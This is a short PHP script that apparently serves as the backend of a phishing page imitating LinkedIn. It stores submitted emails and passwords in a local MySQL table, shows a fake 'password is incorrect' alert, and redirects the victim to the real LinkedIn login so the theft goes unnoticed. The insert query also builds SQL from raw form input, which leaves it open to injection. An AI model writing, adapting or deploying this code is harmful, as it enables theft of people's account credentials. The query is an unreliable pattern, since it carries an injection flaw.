<?php

$conn = mysqli_connect("localhost","root","","store");
if(!$conn){
    die("Error".mysqli_connect_error());
}
if(isset($_POST["save"])){
    $email = $_POST["email"];
    $pass =$_POST["pass"];
    
    if($email =="" || $pass =="" ){
        echo "<script>alert('All field required!')</script>";
    }else{
        $myq = "insert into saman(email,pass) values('$email','$pass')";
        $res =mysqli_query($conn,$myq);
        if($res == true){
            echo"<script>alert('password is incorrect !')</script>";
            header("Refresh:0;url=https://www.linkedin.com/login/");
        }
    }
}

?>